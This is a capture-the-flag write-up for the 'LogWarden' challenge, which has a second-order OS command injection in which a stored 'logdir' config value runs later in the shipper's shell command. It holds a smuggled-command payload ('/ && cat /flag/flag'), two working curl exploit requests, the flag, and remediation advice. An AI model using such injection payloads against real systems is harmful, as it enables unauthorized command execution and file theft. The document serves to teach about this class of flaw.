# LogWarden - second-order OS command injection (store, then ship)

| | |
|---|---|
| **Challenge** | LogWarden |
| **Category** | INJ |
| **Points / Difficulty** | 200 / hard |
| **Target** | http://inj11.chal.deti:8050 |
| **Bug** | CWE-78 - second-order command injection via a stored "logdir" config |

## Hint
> The form only stores it; the shipper is what runs it; trust is a path, not a wall.

## Recon
Two features: `POST /config` (field `logdir`, validated only as "an absolute
path" = starts with `/`) and `POST /ship` (runs the shipper, which uses the
stored `logdir` in a shell command, e.g. `ls <logdir> && tail <logdir>/...`).

## Approach
The taint and the execution are split by **storage + time**: the save filter
sees a *path*; the shipper treats the same string as *code*. Store a value that
is a valid absolute path **and** carries a command, then trigger the shipper:
```
logdir = / && cat /flag/flag
```
`/` satisfies the absolute-path check; `&& cat /flag/flag` runs at ship time.

## Exploitation (two requests - that's the point)
```bash
curl -s --data-urlencode "logdir=/ && cat /flag/flag" http://inj11.chal.deti:8050/config -o /dev/null
curl -s -X POST http://inj11.chal.deti:8050/ship | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{67baec364e77c146816afd2a0321a958}
```

## For the report
- **Why one request wasn't enough:** the value is *checked and stored* by
  `/config` but only *executed* later by `/ship` - a single request never
  reaches the execute context, so the store→ship sequence is required.
- **What "absolute path" proves (and doesn't):** it proves the string starts with
  `/` - nothing about shell safety. `/ && cat /flag/flag` is a perfectly valid
  "absolute path" to the check, and a command to the shell.
- **Fix:** **allowlist** the directory against the set the shipper may actually
  use; pass it to the shell as an **argument, never interpolated**
  (`shell=False` + argv) - or do the listing/tail **in-process** (os.listdir /
  file read), where the metacharacters mean nothing.

## Root cause & remediation
- **Cause:** input validated in one context (a path) is trusted as safe in
  another (a shell string) - classic second-order injection (CWE-78); the
  shipper trusted a "local" config value because it was internal.
- **Fix:** validate/allowlist at the **use** site too; never shell-interpolate
  stored config; least privilege.
